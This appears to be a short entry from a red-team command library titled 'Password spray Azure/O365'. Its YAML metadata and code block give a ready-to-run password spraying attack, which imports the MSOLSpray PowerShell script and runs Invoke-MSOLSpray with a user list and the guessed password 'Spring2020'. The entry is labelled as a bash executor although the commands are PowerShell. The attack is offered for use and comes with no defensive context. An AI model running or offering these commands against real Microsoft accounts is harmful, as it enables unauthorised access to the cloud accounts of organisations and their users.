---
id: c472fe58-5216-4424-8908-68759192266c
name: Password spray Azure/O365
type: command
executor: bash
data: 'Import-Module .\MSOLSpray.ps1

  Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020

  '
output: null
created_at: '2020-07-14T19:07:50.930298+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Password spray Azure/O365

```bash
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020

```
